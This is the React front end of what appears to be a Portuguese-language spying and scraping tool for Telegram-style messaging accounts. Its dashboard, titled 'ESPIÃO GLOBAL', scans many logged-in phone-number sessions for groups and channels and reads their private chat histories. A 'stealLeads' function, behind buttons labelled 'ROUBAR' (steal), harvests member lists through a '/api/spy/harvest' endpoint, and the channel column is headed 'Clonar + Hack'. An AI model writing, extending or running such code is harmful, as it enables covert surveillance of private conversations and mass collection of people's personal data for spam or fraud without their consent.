import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  
  const [tab, setTab] = useState('spy'); // Começa no Espião direto
  const [sessions, setSessions] = useState([]);
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  
  // Estados de Controle
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  
  // Login simples
  const handleLogin = async (e) => {
    e.preventDefault();
    const res = await fetch('/api/admin-login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ password: passwordInput }) });
    const data = await res.json();
    if(data.success) { setIsAuthenticated(true); loadInitialData(); }
  };

  const loadInitialData = async () => {
      // 1. Carrega sessões
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(sData.sessions || []);

      // 2. Carrega chats já salvos no banco (Persistência)
      // Precisamos criar uma API simples pra isso ou usar o Supabase direto se tivesse client side, 
      // mas vamos usar a memória do scan atual por enquanto e salvar no localstorage ou banco via API.
      // Para simplificar, vou focar no SCAN que salva no estado.
  };

  // --- O SCANNER QUE SALVA ---
  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Sem contas para escanear!");
      setIsScanning(true);
      setAllGroups([]); setAllChannels([]);
      
      let foundGroups = [];
      let foundChannels = [];

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          
          try {
              const res = await fetch('/api/spy/list-chats', { 
                  method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} 
              });
              const data = await res.json();
              if (data.chats) {
                  data.chats.forEach(c => {
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') foundChannels.push(chatObj);
                      else foundGroups.push(chatObj);
                  });
              }
          } catch (e) { console.error(e); }
      }

      // Filtra duplicados
      const uniqueGroups = [...new Map(foundGroups.map(item => [item.id, item])).values()];
      const uniqueChannels = [...new Map(foundChannels.map(item => [item.id, item])).values()];

      // Ordena por membros
      setAllGroups(uniqueGroups.sort((a,b) => b.participantsCount - a.participantsCount));
      setAllChannels(uniqueChannels.sort((a,b) => b.participantsCount - a.participantsCount));
      setIsScanning(false);
  };

  const openChat = async (chat) => {
      setViewingChat(chat);
      setLoadingHistory(true);
      const res = await fetch('/api/spy/get-history', { method: 'POST', body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), headers: {'Content-Type': 'application/json'} });
      const data = await res.json();
      setChatHistory(data.history || []);
      setLoadingHistory(false);
  };

  const stealLeads = async (chat) => {
      if(!confirm(`Roubar leads de ${chat.title}?`)) return;
      const res = await fetch('/api/spy/harvest', { 
          method: 'POST', 
          body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id, chatName: chat.title, isChannel: chat.type === 'Canal' }), 
          headers: {'Content-Type': 'application/json'} 
      });
      const data = await res.json();
      alert(data.message || data.error);
  };

  if (!isAuthenticated) return (
    <div style={{background: '#000', height:'100vh', display:'flex', alignItems:'center', justifyContent:'center'}}>
        <form onSubmit={handleLogin}><input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha" style={{padding:'10px'}}/></form>
    </div>
  );

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
        
        {/* MODAL DE LEITURA */}
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:99, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <div style={{width:'600px', height:'80%', background:'#161b22', border:'1px solid #30363d', borderRadius:'10px', display:'flex', flexDirection:'column'}}>
                    <div style={{padding:'15px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between'}}>
                        <h3>{viewingChat.title}</h3>
                        <button onClick={()=>setViewingChat(null)} style={{background:'none', border:'none', color:'white', fontSize:'20px', cursor:'pointer'}}>X</button>
                    </div>
                    <div style={{flex:1, overflowY:'auto', padding:'15px'}}>
                        {loadingHistory ? <p>Carregando...</p> : chatHistory.map(m => (
                            <div key={m.id} style={{marginBottom:'10px', padding:'10px', background: m.isOut ? '#238636' : '#21262d', borderRadius:'5px', maxWidth:'80%', marginLeft: m.isOut ? 'auto' : 0}}>
                                <div style={{fontSize:'10px', color:'#ccc'}}>{m.sender}</div>
                                <div>{m.text}</div>
                                {m.hasMedia && <div style={{color:'#58a6ff', fontSize:'11px'}}>[MÍDIA]</div>}
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        )}

        <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px'}}>
            <h1>🕵️ ESPIÃO GLOBAL ({sessions.length} Contas)</h1>
            <button onClick={scanNetwork} disabled={isScanning} style={{padding:'15px 30px', background:'#8957e5', color:'white', border:'none', borderRadius:'5px', fontSize:'16px', cursor:'pointer', fontWeight:'bold'}}>
                {isScanning ? `VARRENDO REDE... ${scanProgress}%` : '🔄 ESCANEAR TUDO AGORA'}
            </button>
        </div>

        <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
            
            {/* COLUNA GRUPOS */}
            <div style={{background:'#161b22', padding:'15px', borderRadius:'10px', border:'1px solid #30363d'}}>
                <h2 style={{color:'#d29922', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>👥 GRUPOS (Roubar Leads)</h2>
                <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                    {allGroups.map(g => (
                        <div key={g.id} style={{display:'flex', justifyContent:'space-between', alignItems:'center', padding:'10px', borderBottom:'1px solid #21262d'}}>
                            <div>
                                <div style={{fontWeight:'bold', color:'white'}}>{g.title}</div>
                                <div style={{fontSize:'11px'}}>{g.participantsCount} Membros • Via {g.ownerPhone}</div>
                            </div>
                            <div>
                                <button onClick={()=>openChat(g)} style={{padding:'5px 10px', background:'#21262d', color:'white', border:'1px solid #30363d', marginRight:'5px', cursor:'pointer'}}>💬 VER</button>
                                <button onClick={()=>stealLeads(g)} style={{padding:'5px 10px', background:'#d29922', color:'white', border:'none', cursor:'pointer', fontWeight:'bold'}}>🕷️ ROUBAR</button>
                            </div>
                        </div>
                    ))}
                </div>
            </div>

            {/* COLUNA CANAIS */}
            <div style={{background:'#161b22', padding:'15px', borderRadius:'10px', border:'1px solid #30363d'}}>
                <h2 style={{color:'#3390ec', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>📢 CANAIS (Clonar + Hack)</h2>
                <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                    {allChannels.map(c => (
                        <div key={c.id} style={{display:'flex', justifyContent:'space-between', alignItems:'center', padding:'10px', borderBottom:'1px solid #21262d'}}>
                            <div>
                                <div style={{fontWeight:'bold', color:'white'}}>{c.title}</div>
                                <div style={{fontSize:'11px'}}>{c.participantsCount} Inscritos • Via {c.ownerPhone}</div>
                            </div>
                            <div>
                                <button onClick={()=>openChat(c)} style={{padding:'5px 10px', background:'#21262d', color:'white', border:'1px solid #30363d', marginRight:'5px', cursor:'pointer'}}>💬 VER</button>
                                {/* BOTÃO DE TENTATIVA DE ROUBO */}
                                <button onClick={()=>stealLeads(c)} style={{padding:'5px 10px', background:'#1f6feb', color:'white', border:'none', cursor:'pointer', fontWeight:'bold', fontSize:'11px'}}>🕷️ TENTAR COMENTÁRIOS</button>
                            </div>
                        </div>
                    ))}
                </div>
            </div>

        </div>
    </div>
  );
}
